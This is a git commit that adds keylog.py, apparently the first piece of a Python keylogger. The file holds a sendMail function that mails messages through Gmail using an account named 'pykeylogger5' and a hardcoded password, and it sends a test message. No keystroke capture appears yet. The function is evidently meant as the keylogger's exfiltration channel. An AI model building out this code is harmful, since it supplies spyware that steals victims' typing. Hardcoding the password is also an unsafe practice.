391c382fd589eae4b66f61b2294dee5489d0aa7d
KarthikMurugadoss1804 <56566788+KarthikMurugadoss1804@users.noreply.github.com>
2020-12-20 16:08:24 +0000

    Initial commit with sendMail function

---
+++ keylog.py
@@ -0,0 +1,22 @@
+import smtplib, ssl
+def sendMail(message):
+    port = 465  # For SSL
+    smtp_server = "smtp.gmail.com"
+    sender_email = "pykeylogger5@gmail.com"  # Enter your address
+    receiver_email = "pykeylogger5@gmail.com"  # Enter receiver address
+    password = "youcantfindme@123"
+    
+    
+    context = ssl.create_default_context()
+    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, message)
+    
+
+message = """\
+Subject: Hi there
+
+This message is sent from Python."""
+
+
+sendMail(message)
